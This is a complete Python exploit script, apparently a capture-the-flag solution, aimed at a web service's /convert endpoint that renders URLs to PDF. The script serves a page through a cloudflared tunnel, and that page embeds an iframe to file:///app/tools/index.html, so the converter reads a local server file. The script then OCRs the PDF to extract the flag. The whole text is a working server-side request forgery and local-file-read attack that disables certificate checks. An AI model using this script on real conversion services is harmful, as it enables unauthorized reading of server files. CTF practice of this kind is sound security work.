import http.server,threading,subprocess,re,time,os,ssl,urllib.request,urllib.parse,urllib.error,pathlib,glob
TARGET=os.environ['TARGET'].rstrip('/');PORT=8765;ORIGIN='';FLAG=re.compile(r'kaspersky\{[^}\r\n]{1,240}\}',re.I)
class H(http.server.BaseHTTPRequestHandler):
 def log_message(self,fmt,*a): print('HTTP',self.path,fmt%a,flush=True)
 def do_GET(self):
  p=urllib.parse.urlsplit(self.path).path
  if p=='/read':
   b=b'''<!doctype html><html><head><style>html,body{margin:0;padding:0;background:white}iframe{display:block;border:0;width:1100px;height:500px}</style></head><body><iframe width="1100" height="500" src="file:///app/tools/index.html"></iframe></body></html>'''
  else:b=b'<html><body>OK</body></html>'
  self.send_response(200);self.send_header('Content-Type','text/html');self.send_header('Content-Length',str(len(b)));self.end_headers();self.wfile.write(b)
ctx=ssl.create_default_context();ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE
op=urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
def get(u,t=20):
 with op.open(urllib.request.Request(u,headers={'User-Agent':'DFO-READ'}),timeout=t) as r:return r.status,r.read()
def conv(u):
 d=urllib.parse.urlencode({'url':u}).encode();q=urllib.request.Request(TARGET+'/convert',data=d,headers={'Content-Type':'application/x-www-form-urlencoded'})
 try:
  with op.open(q,timeout=55) as r:b=r.read();s=r.status
 except urllib.error.HTTPError as e:b=e.read();s=e.code
 print('CONVERT',s,len(b),b[:20],flush=True);pathlib.Path('/tmp/read.pdf').write_bytes(b)
 if not b.startswith(b'%PDF'):print(b[:2000].decode('utf-8','replace'),flush=True);raise SystemExit(2)
 subprocess.check_call(['pdftoppm','-png','-r','400','/tmp/read.pdf','/tmp/page'],stdout=subprocess.DEVNULL,stderr=subprocess.STDOUT)
 texts=[]
 for f in sorted(glob.glob('/tmp/page-*.png')):
  print('PAGE',f,pathlib.Path(f).stat().st_size,flush=True)
  for psm in ('6','11','3'):
   try:
    x=subprocess.check_output(['tesseract',f,'stdout','--psm',psm],stderr=subprocess.STDOUT,timeout=30).decode('utf-8','replace');print('OCR_PSM_'+psm+': '+repr(x),flush=True);texts.append(x)
   except Exception as e:print('OCR_ERR',psm,repr(e),flush=True)
 alltext='\n'.join(texts);m=FLAG.search(alltext)
 if m:print('FLAG='+m.group(0),flush=True);return
 raise SystemExit('FLAG_NOT_OCRD')
s=http.server.ThreadingHTTPServer(('127.0.0.1',PORT),H);threading.Thread(target=s.serve_forever,daemon=True).start()
c=subprocess.Popen(['/tmp/cloudflared','tunnel','--url',f'http://127.0.0.1:{PORT}','--no-autoupdate','--protocol','http2'],stdout=subprocess.PIPE,stderr=subprocess.STDOUT,text=True,bufsize=1)
while True:
 l=c.stdout.readline();print('CF',l.rstrip(),flush=True);m=re.search(r'https://[a-z0-9-]+\.trycloudflare\.com',l,re.I)
 if m:ORIGIN=m.group();break
for i in range(20):
 try:
  st,b=get(ORIGIN+'/');print('TUNNEL',st,len(b),flush=True);break
 except Exception as e:print('RETRY',repr(e),flush=True);time.sleep(2)
else:raise SystemExit('TUNNEL_FAIL')
conv(ORIGIN+'/read?x='+str(time.time_ns()))
